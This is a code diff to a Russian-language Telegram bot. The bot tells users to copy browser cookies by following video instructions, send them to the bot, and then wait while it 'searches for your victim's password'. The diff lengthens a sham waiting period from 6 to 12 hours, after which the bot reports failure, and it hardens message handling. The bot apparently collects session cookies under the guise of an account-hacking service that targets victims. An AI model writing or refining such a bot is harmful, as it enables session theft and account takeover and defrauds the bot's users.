@@ -706,7 +706,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     elif data == "phone":
-        # Отправляем сообщение с видео и кнопками
         keyboard = [
             [
                 InlineKeyboardButton("◀️ Вернуться", callback_data="back_to_menu"),
@@ -715,14 +714,17 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        # Отправляем видео
-        await query.message.reply_video(
+        # Отправляем новое сообщение с видео
+        await update.effective_chat.send_video(
             video="https://t.me/cookieeditort/3",
             caption="📱 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
         # Удаляем сообщение с выбором устройства
-        await query.message.delete()
+        try:
+            await query.message.delete()
+        except:
+            pass
         return
     
     elif data == "computer":
@@ -734,12 +736,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await query.message.reply_video(
+        await update.effective_chat.send_video(
             video="https://t.me/cookieeditort/4",
             caption="💻 Посмотрите видео полностью и выполните все указания как в видео и тогда все сработает.",
             reply_markup=reply_markup
         )
-        await query.message.delete()
+        try:
+            await query.message.delete()
+        except:
+            pass
         return
     
     elif data == "cookies_copied":
@@ -756,8 +761,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             "✅ Отлично!\n\n"
             "📋 Теперь отправьте cookie в бота\n"
             "Бот начнет поиск пароля вашей жертвы 😈\n"
-            "В течении дня бот скинет вам пароль от аккаунта\n\n"
-            f"🎯 У вас осталось {available} попыток"
+            "В течении дня бот скинет вам пароль от аккаунта"
         )
         return
     
@@ -1242,7 +1246,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(
             f"✅ Отлично! Бот начал поиски пароля вашей жертвы.\n"
             f"Не создавайте повторных заявок, иначе будете заблокированы\n"
-            f"Если в течении 6 часов бот не ответил, значит он не нашел пароль\n\n"
+            f"Если в течении 12 часов бот не ответил, значит он не нашел пароль\n\n"
             f"🎯 Осталось попыток: {get_available_attempts(user_id)}"
         )
         asyncio.create_task(send_delayed_message(update.effective_chat.id, context))
@@ -1280,11 +1284,11 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("У вас нет активных действий.")
 
 # ===================================================
-# ФУНКЦИЯ ЗАДЕРЖКИ
+# ФУНКЦИЯ ЗАДЕРЖКИ (12 ЧАСОВ)
 # ===================================================
 
 async def send_delayed_message(chat_id, context):
-    delay_seconds = 6 * 3600 + 3 * 60
+    delay_seconds = 12 * 3600  # 12 часов
     try:
         await asyncio.sleep(delay_seconds)
         await context.bot.send_message(
@@ -1309,6 +1313,7 @@ def main():
     print("🤖 Бот запущен!")
     print("✅ Попытки тратятся ТОЛЬКО при отправке ключевого слова")
     print("✅ 2 бесплатные попытки + 1 за приглашение")
+    print("⏰ Отложенное сообщение через 12 часов")
     print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
     app.run_polling()
 
